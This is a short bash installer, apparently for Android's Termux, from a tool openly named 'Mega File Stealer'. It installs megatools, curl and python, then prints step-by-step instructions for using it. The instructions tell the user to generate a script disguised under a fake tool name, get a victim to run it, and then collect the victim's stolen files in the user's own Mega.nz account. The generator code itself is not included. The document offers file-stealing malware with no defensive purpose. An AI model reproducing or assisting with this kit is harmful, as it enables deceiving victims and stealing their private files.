#!/bin/bash

echo -e "   ┌─────────────────────────────────────────┐"
echo -e "   │  \033[0;34mName\033[0;0m    : \033[0;36mMega File Stealer\033[0;0m            │"
echo -e "   │  \033[0;34mVersion\033[0;0m : \033[0;36m2.3\033[0;0m                          │"
echo -e "   │  \033[0;34mAuthor\033[0;0m  : \033[0;36mMALIK ATIQUZ ZAMAN\033[0;0m                    │"
echo -e "   │  \033[0;34mGitHub\033[0;0m  : \033[0;36mhttps://github.com/MALIK332\033[0;0m  │"
echo -e "   └─────────────────────────────────────────┘"

pkg install megatools -y
pkg install curl -y
pkg install python -y
pip install --upgrade pip
chmod +x *

# Instruction
echo -e "\e[92mINSTRUCTION:\e[0m"
echo -e " 1. \e[32mCreate an account in Mega.nz\e[0m"
echo -e " 2. \e[32mRun my program by typing: python MEGA-FILE-STEALER.py\e[0m"
echo -e " 3. \e[32mEnter your mega.nz username, email anf password. Then enter any fake tool name\e[0m"
echo -e " 4. \e[32mFind the tool that appear in your file manager, give it to your victim.\e[0m"
echo -e " 5. \e[32mMake your victim run the script you have gave.\e[0m"
echo -e " 6. \e[32mIf you successfully make your target run the script, open your mega.nz account and you will see there the files you have stole.\e[0m"
